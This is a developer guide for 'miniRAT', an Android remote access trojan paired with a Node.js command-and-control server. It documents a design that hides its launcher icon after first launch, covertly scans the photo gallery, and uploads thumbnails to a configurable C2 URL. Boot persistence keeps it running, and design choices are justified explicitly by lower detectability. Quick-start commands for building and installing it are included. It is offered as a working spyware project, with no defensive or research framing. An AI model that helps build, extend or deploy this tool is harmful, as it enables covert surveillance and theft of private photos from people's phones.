# Project Context — miniRAT

> Developer guide: conventions, codebase navigation, setup, and key design decisions.

---

## Project Identity

| Property | Value |
|---|---|
| Name | miniRAT |
| Package | `com.app.minirat` |
| Type | Android RAT + Node.js C2 server |
| Language (Client) | Java (Android) |
| Language (Server) | JavaScript (Node.js) |
| Min Android | API 21 (Android 5.0) |
| Target Android | API 36 |
| Repository | `Rhishavhere/miniRAT` |

---

## Codebase Map

```
miniRAT/
├── app/src/main/
│   ├── AndroidManifest.xml             # Permissions + components
│   └── java/com/app/minirat/
│       ├── HiddenActivity.java         # [ENTRY] Permission → service → hide → finish
│       ├── Service.java                # [CORE] One-time gallery scan + upload
│       └── BootReceiver.java           # [PERSISTENCE] Restart on boot
├── server.js                           # C2 server
└── app/local.properties                # DOMAIN_URL config
```

---

## Key Design Decisions

| Decision | Rationale |
|---|---|
| **One-time scan** (not periodic) | Reduces detectability; re-scans on reboot via BootReceiver |
| **Thumbnail-only** (128×128 JPEG) | ~5-15 KB per image; low bandwidth footprint |
| **ContentUris** (not file paths) | Scoped storage compatible on Android 10+ |
| **Single-thread executor** | Sequential uploads; prevents OOM from concurrent bitmap ops |
| **App drawer hiding** | `setComponentEnabledSetting(DISABLED)` after first launch |
| **BuildConfig for server URL** | Compile-time injection from `local.properties` |

---

## Component Roles

| Component | Responsibility | Lifecycle |
|---|---|---|
| `HiddenActivity` | Permission + service start + hide from drawer | First launch only |
| `Service` | Gallery scan → thumbnail → upload | Once per service start |
| `BootReceiver` | Restart service after reboot | On boot event |
| `server.js` | Receive thumbnails, serve gallery | Always running |

---

## Configuration

| Property | File | Description |
|---|---|---|
| `DOMAIN_URL` | `app/local.properties` | C2 server URL (injected into BuildConfig) |
| Port `3000` | `server.js` | Server listen port |
| `128×128` px | `Service.java` | Thumbnail resolution |
| JPEG `70%` | `Service.java` | Compression quality |

### URL Flow
```
local.properties → build.gradle.kts → BuildConfig.DOMAIN_URL → Service.SERVER_URL
```

---

## Permissions

| Permission | API Range | Used By |
|---|---|---|
| `INTERNET` | All | `Service` — HTTP uploads |
| `ACCESS_NETWORK_STATE` | All | Network checks |
| `READ_EXTERNAL_STORAGE` | 21–32 | `Service` — MediaStore queries |
| `READ_MEDIA_IMAGES` | 33+ | `Service` — MediaStore on Android 13+ |
| `RECEIVE_BOOT_COMPLETED` | All | `BootReceiver` |
| `FOREGROUND_SERVICE` | 26+ | `Service` — foreground service |

---

## Quick Start

```bash
git clone https://github.com/Rhishavhere/miniRAT.git
cd miniRAT

echo "DOMAIN_URL=http://YOUR_SERVER:3000" > app/local.properties

npm install express cors multer
node server.js

./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

---

## Conventions

| Area | Convention |
|---|---|
| Naming | Package `com.app.minirat`, log tags match class names |
| Error handling | All exceptions caught at method boundaries, logged via `Log.e` |
| Threading | UI thread: lifecycle only. Background: single `ExecutorService` |
| JSON | `org.json.JSONObject` for all payload construction |
| Bitmap | `inSampleSize` decoding + `recycle()` after use |
| Media access | `ContentUris` + `ParcelFileDescriptor` (no deprecated `DATA` column) |

---

## Gotchas

1. **First launch required** — App must be opened once for `BOOT_COMPLETED` to work on Android 10+
2. **Permission denial** — If user denies, MediaStore returns 0 results (no crash, just no images)
3. **App icon gone** — After first launch, only reinstall or `adb` can re-trigger the launcher
4. **No deduplication** — Reboots re-upload the entire gallery
5. **`local.properties` domain** — Must be changed before building for your server
6. **Compose deps unused** — Adds ~5MB to APK; could be removed from `build.gradle.kts`
